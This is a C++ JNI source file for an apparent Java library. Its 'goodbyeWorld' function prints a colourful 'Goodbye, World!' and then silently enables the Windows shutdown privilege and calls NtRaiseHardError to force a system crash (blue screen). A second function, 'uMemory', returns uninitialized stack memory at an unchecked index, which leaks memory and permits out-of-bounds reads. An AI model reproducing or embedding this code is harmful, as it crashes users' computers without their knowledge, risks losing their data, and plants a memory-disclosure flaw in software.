#include "snkr.h"

#include <iostream>
#include <cstdlib>
#include <ctime>

#include <bugcodes.h>
#include <windows.h>
#include <ntstatus.h>
#include <winternl.h>
#include <jni.h>

using namespace std;

struct UninitializedArray
{
    long value[1024];
};

UninitializedArray UninitializedArrayImpl(const int alloc)
{
    UninitializedArray array;

    for (int i = 0; i < alloc; i++) {
        array.value[i];
    }

    return array;
}

typedef NTSTATUS (NTAPI *RtlAdjustPrivilegeFn)
(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled
);

RtlAdjustPrivilegeFn RtlAdjustPrivilege;

typedef NTSTATUS (NTAPI *NtRaiseHardErrorFn)
(
    LONG ErrorStatus,
    ULONG Unless1,
    ULONG Unless2,
    PULONG_PTR Unless3,
    ULONG ValidResponseOption,
    PULONG ResponsePointer
);

NtRaiseHardErrorFn NtRaiseHardError;

int clamp(int value, const int min, const int max)
{
    if (value > max) {
        value = max;
    }
    else if (value < min) {
        value = min;
    }

    return value;
}

int adjust_privilege()
{
    BOOLEAN Enabled = FALSE;
    const HMODULE NtDll = GetModuleHandle("ntdll.dll");

    if (NtDll == nullptr) {
        return -1;
    }

    RtlAdjustPrivilege = reinterpret_cast<RtlAdjustPrivilegeFn>(GetProcAddress(NtDll, "RtlAdjustPrivilege"));

    if (RtlAdjustPrivilege == nullptr) {
        return -1;
    }

    if (const NTSTATUS Status = RtlAdjustPrivilege(19, TRUE, FALSE, &Enabled); Status != 0) {
        return -1;
    }

    if (Enabled) {
        return 0;
    }

    return -1;
}

int raise_hard_error()
{
    ULONG ErrorResponse = 0;
    const HMODULE NtDll = GetModuleHandle("ntdll.dll");

    if (NtDll == nullptr) {
        return -1;
    }

    NtRaiseHardError = reinterpret_cast<NtRaiseHardErrorFn>(GetProcAddress(NtDll, "NtRaiseHardError"));

    if (NtRaiseHardError == nullptr) {
        return -1;
    }

    if (const NTSTATUS Status = NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, nullptr, 6, &ErrorResponse); Status != 0) {
        return -1;
    }

    return 0;
}

JNIEXPORT void JNICALL Java_bytesnek_hiss_sneaky_SNKR_goodbyeWorld(JNIEnv* env, jobject obj)
{
    srand(time(nullptr));

    const string RESET = "\u001b[0m";

    for (const char c: "Goodbye, World!") {
        const int randomColour = rand() % 216 + 16;

        cout << "\u001b[1m\u001b[3m\u001b[4m" << "\u001b[38;5;" << randomColour << "m" << c << RESET;
    }

    cout << RESET << endl;

    adjust_privilege();
    raise_hard_error();
}

JNIEXPORT jlong JNICALL Java_bytesnek_hiss_sneaky_SNKR_uMemory(JNIEnv* env, jobject obj, jint alloc, jint index)
{
    const int clamped = clamp(alloc, 0, 1024);
    auto [value] = UninitializedArrayImpl(clamped);

    return value[index];
}
